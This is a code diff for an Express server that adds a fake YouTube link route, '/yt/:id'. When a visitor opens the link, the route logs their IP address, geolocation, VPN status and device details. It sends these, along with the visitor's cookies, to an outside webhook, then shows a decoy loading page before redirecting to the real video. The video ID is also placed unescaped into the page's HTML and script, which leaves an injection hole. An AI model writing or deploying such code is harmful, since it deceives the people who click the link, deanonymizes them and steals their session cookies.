@@ -730,6 +730,179 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // YouTube proxy route that logs IP and redirects to real video
+  app.get('/yt/:id', async (req: Request, res: Response) => {
+    try {
+      const { id } = req.params;
+      const { v: videoId } = req.query;
+
+      if (!videoId) {
+        return res.status(400).send('Invalid YouTube video ID');
+      }
+
+      const clientIp = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      const referrerHeader = req.headers.referer || req.headers.referrer;
+      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
+      const locationData = getLocationFromIp(clientIp);
+      const deviceInfo = parseDeviceInfo(userAgent);
+
+      // Log the YouTube proxy access
+      await storage.createIpLog({
+        ipAddress: clientIp,
+        userAgent,
+        referrer,
+        location: locationData.location,
+        status: 'youtube_proxy_access',
+        isVpn: locationData.isVpn,
+        vpnLocation: locationData.vpnLocation,
+        realLocation: locationData.realLocation,
+        deviceType: deviceInfo.deviceType,
+        browserName: deviceInfo.browserName,
+        operatingSystem: deviceInfo.operatingSystem,
+        deviceBrand: deviceInfo.deviceBrand
+      });
+
+      // Try to find settings with webhook for notification
+      let settings = null;
+      let imageOwnerUserId = null;
+
+      try {
+        const foundSettings = await storage.getSettingsWithImageOrWebhook();
+        if (foundSettings) {
+          settings = foundSettings.settings;
+          imageOwnerUserId = foundSettings.userId;
+        }
+      } catch (storageError) {
+        console.log('Error accessing storage:', storageError);
+      }
+
+      // Send to webhook if configured
+      if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
+        console.log(`📺 YouTube proxy access from IP: ${clientIp}`);
+
+        // Send webhook in background
+        sendToWebhook(settings.webhookUrl, {
+          ipAddress: clientIp,
+          userAgent,
+          referrer,
+          location: locationData.location,
+          isVpn: locationData.isVpn,
+          vpnLocation: locationData.vpnLocation,
+          realLocation: locationData.realLocation,
+          deviceType: deviceInfo.deviceType,
+          browserName: deviceInfo.browserName,
+          operatingSystem: deviceInfo.operatingSystem,
+          deviceBrand: deviceInfo.deviceBrand,
+          cookies: req.headers.cookie || 'None',
+          tokens: 'YouTube Proxy Access'
+        }).catch(webhookError => {
+          console.error('❌ Webhook sending failed:', webhookError);
+        });
+      }
+
+      // Serve HTML page that immediately redirects to YouTube
+      const redirectHtml = `
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading YouTube Video...</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <!-- YouTube meta tags for sharing -->
+  <meta property="og:type" content="video.other">
+  <meta property="og:title" content="YouTube Video">
+  <meta property="og:description" content="Watch this video on YouTube">
+  <meta property="og:image" content="https://img.youtube.com/vi/${videoId}/maxresdefault.jpg">
+  <meta property="og:video" content="https://www.youtube.com/watch?v=${videoId}">
+  
+  <style>
+    body { 
+      margin: 0; 
+      padding: 0; 
+      font-family: Arial, sans-serif; 
+      background: #0f0f0f;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+    .youtube-logo {
+      width: 80px;
+      height: 56px;
+      background: #ff0000;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .loading {
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    .redirect-btn {
+      background: #ff0000;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      text-decoration: none;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="youtube-logo">▶</div>
+    <h2 class="loading">Loading YouTube Video...</h2>
+    <p>You will be redirected to YouTube shortly.</p>
+    <a href="https://www.youtube.com/watch?v=${videoId}" class="redirect-btn">
+      Continue to YouTube
+    </a>
+  </div>
+
+  <script>
+    // Immediate redirect to YouTube
+    setTimeout(function() {
+      window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
+    }, 1500);
+    
+    // Fallback redirect if user clicks anywhere
+    document.addEventListener('click', function() {
+      window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
+    });
+  </script>
+</body>
+</html>`;
+
+      res.set({
+        'Content-Type': 'text/html',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+      });
+      res.send(redirectHtml);
+    } catch (error) {
+      console.error('Error in YouTube proxy:', error);
+      res.status(500).send('Error loading video');
+    }
+  });
+
   // Serve tracking HTML page that logs everything
   app.get('/track/:id', async (req: Request, res: Response) => {
     try {
